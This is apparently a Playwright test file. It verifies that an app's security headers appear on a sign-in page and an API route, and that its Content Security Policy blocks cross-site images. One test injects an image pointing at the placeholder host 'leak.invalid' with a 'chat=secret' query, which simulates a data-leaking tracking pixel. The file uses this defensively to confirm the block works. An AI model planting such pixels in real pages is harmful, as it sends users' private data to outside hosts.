import { SECURITY_HEADERS } from "../src/start"
import { expect, test } from "./session"

// The security headers from src/start.ts, on a page and on /api.

for (const path of ["/sign-in", "/api/auth/ok"]) {
  test(`${path} carries the security headers`, async ({ request }) => {
    const headers = (await request.get(path)).headers()
    for (const [name, value] of Object.entries(SECURITY_HEADERS)) {
      expect(headers[name.toLowerCase()]).toBe(value)
    }
  })
}

test.describe(() => {
  // The browser logs the blocked image.
  test.use({ allowedProblems: [/Content Security Policy/] })

  test("a page won't load an image from another site", async ({ page }) => {
    await page.goto("/sign-in")
    const blocked = await page.evaluate(
      () =>
        new Promise<string>((resolve) => {
          document.addEventListener(
            "securitypolicyviolation",
            (event) => resolve(event.effectiveDirective),
            { once: true }
          )
          const image = document.createElement("img")
          image.src = "https://leak.invalid/pixel.png?chat=secret"
          document.body.appendChild(image)
        })
    )
    expect(blocked).toBe("img-src")
  })
})
